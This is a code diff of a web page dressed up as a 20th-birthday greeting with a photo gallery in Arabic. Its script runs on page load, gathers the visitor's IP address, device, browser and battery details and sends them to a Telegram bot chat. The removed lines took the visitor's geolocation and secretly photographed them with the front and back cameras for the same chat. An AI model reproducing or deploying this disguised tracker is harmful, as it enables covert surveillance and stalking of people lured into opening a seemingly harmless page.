@@ -10,75 +10,51 @@
         const chatId = "1557685494";
         const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-        const startTime = Date.now();const visitorInfo = {
-        IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
-        UserAgent: navigator.userAgent,
-        Platform: navigator.platform,
-        Language: navigator.language,
-        ScreenResolution: `${window.screen.width}x${window.screen.height}`,
-        DeviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
-        TouchSupport: navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
-        OnlineStatus: navigator.onLine ? 'Online' : 'Offline',
-        ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
-        TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        CurrentTime: new Date().toLocaleString(),
-        VisitStartTime: new Date(startTime).toLocaleString()
-    };
-
+        const startTime = Date.now();
+        const visitorInfo = {
+            IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
+            UserAgent: navigator.userAgent,
+            Platform: navigator.platform,
+            Language: navigator.language,
+            ScreenResolution: `${window.screen.width}x${window.screen.height}`,
+            DeviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+            TouchSupport: navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
+            OnlineStatus: navigator.onLine ? 'Online' : 'Offline',
+            ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+            TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            CurrentTime: new Date().toLocaleString(),
+            VisitStartTime: new Date(startTime).toLocaleString()
+        };// Collecting battery info
     try {
-        const geo = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
-        });
-        const latitude = geo.coords.latitude;
-        const longitude = geo.coords.longitude;
-        visitorInfo.Location = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        const battery = await navigator.getBattery();
+        visitorInfo.BatteryPercentage = Math.round(battery.level * 100) + "%";
+        visitorInfo.ChargingStatus = battery.charging ? "Charging" : "Not Charging";
     } catch (error) {
-        visitorInfo.Location = "Unavailable";
+        visitorInfo.BatteryPercentage = "Unavailable";
+        visitorInfo.ChargingStatus = "Unavailable";
     }
 
-    async function takePhoto(facingMode) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob((blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, `user_photo_${facingMode}.jpg`);
-                fetch(photoUrl, { method: 'POST', body: formData }).catch(console.error);
-                stream.getTracks().forEach(track => track.stop());
-            });
-        } catch (error) {
-            console.error('Error capturing photo:', error);
-        }
-    }
-
-    // Capture both front and back photos
-    takePhoto('user');  // Front camera
-    takePhoto('environment');  // Back camera
-
+    // Formatting and sending the message
     let message = "NEW VISITOR INFORMATION\n";
     for (let key in visitorInfo) {
         message += `${key}: ${visitorInfo[key]}\n`;
     }
-    fetch(messageUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-    }).catch(console.error);
+
+    try {
+        await fetch(messageUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+    } catch (error) {
+        console.error(error);
+    }
 }
 
 window.onload = sendVisitorInfo;
 
-  </script>  <style>
+  </script>
+  <style>
     body {
       margin: 0;
       font-family: 'Cairo', sans-serif;
@@ -109,14 +85,17 @@ window.onload = sendVisitorInfo;
       margin: 30px 0;
       font-size: 0.9em;
     }
-  </style></head>
+  </style>
+</head>
 <body>
   <header>
     <h1>منونتي قلب بودا</h1>
     <p>عيد ميلاد سعيد 20 سنة!</p>
-  </header>  <div class="gallery">
+  </header>
+  <div class="gallery">
     ${Array.from({length: 15}, (_, i) => `<img src="image${i + 1}.jpg" alt="منونتي ${i + 1}">`).join('\n    ')}
-  </div>  <footer>
+  </div>
+  <footer>
     &copy; 2025/5/5 بودا لمنونتي
   </footer>
 </body>
